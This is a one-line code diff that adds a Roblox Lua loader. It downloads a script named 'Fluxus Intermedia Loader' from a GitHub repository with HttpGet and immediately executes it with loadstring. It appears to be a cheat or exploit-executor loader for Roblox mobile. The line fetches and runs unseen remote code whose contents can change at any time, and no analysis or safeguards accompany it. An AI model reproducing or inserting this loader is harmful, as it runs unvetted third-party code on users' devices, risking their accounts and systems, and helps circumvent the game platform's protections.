@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/MuhXd/Roblox-mobile-script/blob/main/Fluxus/Intermedia%20Loader.lua?raw=true"))();
